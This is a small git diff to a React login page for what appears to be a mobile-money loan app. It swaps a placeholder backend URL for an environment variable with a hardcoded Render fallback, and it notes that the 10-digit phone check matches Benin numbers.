@@ -2,8 +2,8 @@ import { useState, type FormEvent } from "react";
 import { useNavigate } from "react-router-dom";
 import { Wallet, Eye, Lock, ShieldCheck } from "lucide-react";
 
-// ⚠️ REPLACE THIS WITH YOUR ACTUAL RENDER URL
-const API_URL = "https://YOUR-RENDER-URL.onrender.com";
+// ✅ UPDATED: Hardcoded your actual Render URL as the fallback
+const API_URL = import.meta.env.VITE_API_URL || "https://fastloan-momo.onrender.com";
 
 const Login = () => {
   const [phone, setPhone] = useState("");
@@ -11,6 +11,7 @@ const Login = () => {
   const [showPin, setShowPin] = useState(false);
   const navigate = useNavigate();
 
+  // Benin phone numbers are 10 digits
   const isFormValid = phone.length === 10 && pin.length === 5;
 
   const handleLogin = async (e: FormEvent) => {
